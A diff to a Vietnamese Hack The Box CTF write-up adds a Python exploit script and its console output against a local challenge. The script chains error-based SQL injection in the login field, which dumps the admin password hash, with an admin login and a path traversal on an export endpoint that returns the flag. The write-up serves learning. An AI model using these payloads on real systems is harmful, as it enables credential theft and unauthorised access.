@@ -363,7 +363,121 @@ COPY files /communications/
 "name":"../../../signal_sleuth_firmware"
 }
 ```
-<img width="947" height="563" alt="image" src="https://github.com/user-attachments/assets/12789d3e-dce8-4e84-84be-5c811f36fc13" /><br>
+để tự động hóa quá trình exploit tôi sẽ viết tập lệnh python: <br>
+```py
+import requests
+import re
+import os
+
+class Exploit:
+    def __init__(self, baseUrl, header):
+        self.baseUrl = baseUrl
+        self.header = header
+        self.login_path = "/api/login"
+        self.export_path = "/api/export"
+        self.session = requests.Session()
+    
+    def dump_hash_value_admin(self):
+        print(f"[+] Start Leak Data Hash MD5 Admin")
+        hash_full = ""
+        for pos in range(1, 33):
+            payload = f'" OR extractvalue(1,concat(0x7e,substring((SELECT password FROM users WHERE username=\'admin\'),{pos},1),0x7e)) -- -'
+            data = {
+                "username": payload,
+                "password": "bl4ck0ut"
+            }
+            response = requests.post(f"{self.baseUrl}{self.login_path}", headers=self.header, json=data)
+            match = re.search(r"~([^~])~", response.text)
+            if match:
+                char = match.group(1)
+                hash_full += char
+                print(f"[+] Found Value {pos}: {char} -> {hash_full}")
+            else:
+                print(f"[-] Not Found Value! Try Again: {pos}")
+                break
+        return hash_full
+
+    def login(self, password="DUMMY_PASSWORD"):
+        print(f"[+] Password Convert From Hash Md5: {password}")
+        print(f"[+] Login With admin:{password}")
+        data = {
+            "username": "admin",
+            "password": password
+        }
+        response = self.session.post(f"{self.baseUrl}{self.login_path}", headers=self.header, json=data)
+        if response.status_code == 200:
+            print(f"[+] Login Successfully as Admin.")
+        else:
+            print(f"[-] Failed Login. Try Again")
+
+    def export(self):
+        print(f"[+] Khai thác path traversal ở tuyến đường /export")
+        data = {
+            "name": "../../../../signal_sleuth_firmware"
+        }
+        response = self.session.post(f"{self.baseUrl}{self.export_path}", headers=self.header, json=data)
+        flag = re.findall(r"HTB\{.*?\}", response.text)
+        if flag:
+            flag_done = flag[0]
+            print(f"[+] Congratulation! Done Flag: \n{flag_done}")
+        else:
+            print(f"[-] Failed to leak flag. Try again!!!")
+    
+if __name__ == "__main__":
+    BASE_URL = "http://127.0.0.1:1337"
+    HEADER = {
+        "Content-Type": "application/json",
+        "Origin": "http://127.0.0.1:1337",
+        "Referer": "http://127.0.0.1:1337/"
+    }
+    exploit = Exploit(BASE_URL, HEADER)
+    hash_md5 = exploit.dump_hash_value_admin()
+    exploit.login() 
+    exploit.export()
+```
+```note
+┌──(bl4ck0ut㉿DESKTOP-NC78VN5)-[~]
+└─$ python3 a.py
+[+] Start Leak Data Hash MD5 Admin
+[+] Found Value 1: 2 -> 2
+[+] Found Value 2: a -> 2a
+[+] Found Value 3: c -> 2ac
+[+] Found Value 4: b -> 2acb
+[+] Found Value 5: 5 -> 2acb5
+[+] Found Value 6: b -> 2acb5b
+[+] Found Value 7: 6 -> 2acb5b6
+[+] Found Value 8: 6 -> 2acb5b66
+[+] Found Value 9: 0 -> 2acb5b660
+[+] Found Value 10: 5 -> 2acb5b6605
+[+] Found Value 11: f -> 2acb5b6605f
+[+] Found Value 12: 3 -> 2acb5b6605f3
+[+] Found Value 13: 3 -> 2acb5b6605f33
+[+] Found Value 14: 6 -> 2acb5b6605f336
+[+] Found Value 15: 6 -> 2acb5b6605f3366
+[+] Found Value 16: 0 -> 2acb5b6605f33660
+[+] Found Value 17: 7 -> 2acb5b6605f336607
+[+] Found Value 18: 6 -> 2acb5b6605f3366076
+[+] Found Value 19: 6 -> 2acb5b6605f33660766
+[+] Found Value 20: 5 -> 2acb5b6605f336607665
+[+] Found Value 21: 0 -> 2acb5b6605f3366076650
+[+] Found Value 22: 6 -> 2acb5b6605f33660766506
+[+] Found Value 23: 8 -> 2acb5b6605f336607665068
+[+] Found Value 24: 6 -> 2acb5b6605f3366076650686
+[+] Found Value 25: b -> 2acb5b6605f3366076650686b
+[+] Found Value 26: f -> 2acb5b6605f3366076650686bf
+[+] Found Value 27: d -> 2acb5b6605f3366076650686bfd
+[+] Found Value 28: e -> 2acb5b6605f3366076650686bfde
+[+] Found Value 29: 5 -> 2acb5b6605f3366076650686bfde5
+[+] Found Value 30: 4 -> 2acb5b6605f3366076650686bfde54
+[+] Found Value 31: c -> 2acb5b6605f3366076650686bfde54c
+[+] Found Value 32: 2 -> 2acb5b6605f3366076650686bfde54c2
+[+] Password Convert From Hash Md5: DUMMY_PASSWORD
+[+] Login With admin:DUMMY_PASSWORD
+[+] Login Successfully as Admin.
+[+] Khai thác path traversal ở tuyến đường /export
+[+] Congratulation! Done Flag:
+HTB{p4r4m3t3r1z4t10n_EXTRA_LONG_RANDOM_DATA_1234567890}
+```
 > Flag: <b>HTB{p4r4m3t3r1z4t10n_EXTRA_LONG_RANDOM_DATA_1234567890}</b>
 #### Kết luận
 > Những gì tôi học được:
